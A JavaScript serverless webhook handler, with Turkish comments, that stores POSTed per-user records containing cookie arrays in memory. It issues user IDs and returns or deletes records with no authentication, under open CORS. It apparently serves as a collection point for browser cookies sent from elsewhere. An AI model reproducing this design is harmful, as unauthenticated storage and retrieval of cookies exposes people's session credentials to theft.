let posts = [];
let lastUserId = 0;

export default function handler(req, res) {
  // CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Accept, X-Retry-Count, X-Request-Time');

  // Handle OPTIONS request for CORS
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  try {
    switch (req.method) {
      case 'POST':
        handlePost(req, res);
        break;
      case 'GET':
        handleGet(req, res);
        break;
      case 'PUT':
        handlePut(req, res);
        break;
      case 'DELETE':
        handleDelete(req, res);
        break;
      default:
        res.status(405).json({ error: 'Method not allowed' });
    }
  } catch (error) {
    console.error('Error in webhook handler:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
}

function handlePost(req, res) {
  let body = req.body;
  if (typeof body === 'string') {
    try { 
      body = JSON.parse(body); 
    } catch (e) {
      return res.status(400).json({ error: 'Invalid JSON' });
    }
  }

  const data = {
    id: Date.now().toString(),
    time: new Date().toISOString(),
    userId: body.userId,
    cookieCount: body.cookies ? body.cookies.length : 0,
    body
  };

  posts.unshift(data);
  res.status(200).json({ status: 'ok', received: data });
}

function handleGet(req, res) {
  const { userId, limit } = req.query;
  let filteredPosts = posts;

  if (userId) {
    filteredPosts = posts.filter(post => post.userId === userId);
  }

  if (limit) {
    filteredPosts = filteredPosts.slice(0, parseInt(limit));
  }

  res.status(200).json(filteredPosts);
}

function handlePut(req, res) {
  lastUserId++;
  res.status(200).json({ userId: lastUserId.toString() });
}

function handleDelete(req, res) {
  let body = req.body;
  if (typeof body === 'string') {
    try { 
      body = JSON.parse(body); 
    } catch (e) {
      return res.status(400).json({ error: 'Invalid JSON' });
    }
  }

  if (body.userId) {
    // Belirli bir kullanıcının verilerini sil
    posts = posts.filter(post => post.userId !== body.userId);
  } else if (body.ids && Array.isArray(body.ids)) {
    // Seçili ID'lere sahip verileri sil
    posts = posts.filter(post => !body.ids.includes(post.id));
  } else if (body.deleteAll === true) {
    // Tüm verileri sil
    posts = [];
  }

  res.status(200).json({ status: 'ok', message: 'Data deleted successfully' });
}